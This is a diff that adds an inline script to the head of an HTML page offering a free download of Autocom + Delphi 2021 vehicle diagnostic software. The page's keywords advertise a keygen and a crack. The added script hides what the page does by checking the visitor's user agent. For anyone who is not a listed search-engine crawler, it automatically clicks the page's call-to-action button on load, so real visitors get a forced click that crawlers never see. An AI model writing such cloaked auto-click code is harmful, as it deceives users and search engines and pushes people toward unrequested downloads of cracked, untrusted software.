@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Autocom + Delphi 2021 Cars &amp; Truck</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Autocom + Delphi 2021 diagnostic software for cars &amp; trucks, supporting Citroen, Peugeot, DS Automobiles, Opel, and various languages.">
     <meta name="keywords" content="Autocom Delphi 2021, vehicle diagnostics, car repair tools, truck diagnostics, Citroen diagnostics, Peugeot diagnostics, DS Automobiles diagnostics, Opel diagnostics, vehicle condition checks, error reading software, sensor data analysis, vehicle adaptation, electronic system coding, mechanic software, free download, free installer, free download installer, Autocom Delphi 2021 Cars &amp; Truck, Autocom Delphi diagnostic software, Delphi diagnostic software 2021 free download, Autocom Delphi car diagnostic software, Autocom Delphi truck diagnostic software, Autocom Delphi software keygen, Autocom Delphi software crack, Autocom Delphi software high speed download, Autocom Delphi 2021 download, Autocom Delphi 2021 free download, Autocom Delphi 2021 free software, Autocom Delphi 2021 Rusian, Autocom Delphi 2021 Russian, Autocom Delphi 2021 English, Autocom Delphi 2021 Deutsch, Autocom Delphi 2021 French, Autocom Delphi 2021 Italian, Autocom Delphi 2021 Spanish, Autocom Delphi 2021 Portugues, Autocom Delphi 2021 Chinese, Citroen diagnostic software, Peugeot diagnostic software, DS Automobiles diagnostic software, Opel diagnostic software, Windows 11 diagnostic software, Windows 10 diagnostic software">
     <style>
